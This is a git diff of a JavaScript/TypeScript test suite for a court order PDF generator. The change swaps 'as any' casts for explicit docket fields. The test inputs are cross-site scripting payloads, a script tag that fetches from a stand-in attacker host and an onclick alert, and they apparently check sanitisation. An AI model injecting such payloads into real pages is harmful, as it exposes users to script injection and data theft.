@@ -164,7 +164,10 @@ describe('createCourtIssuedOrderPdfFromHtmlInteractor', () => {
           addedDocketNumbers: [],
           contentHtml:
             '<p>Order body</p><script>fetch("https://attacker.example")</script>',
-        } as any,
+          docketNumber: '123-45',
+          documentTitle: 'Order',
+          eventCode: 'O',
+        },
         mockDocketClerkUser,
       );
 
@@ -181,7 +184,10 @@ describe('createCourtIssuedOrderPdfFromHtmlInteractor', () => {
         {
           addedDocketNumbers: [],
           contentHtml: '<p onclick="alert(1)">Order body</p>',
-        } as any,
+          docketNumber: '123-45',
+          documentTitle: 'Order',
+          eventCode: 'O',
+        },
         mockDocketClerkUser,
       );
 
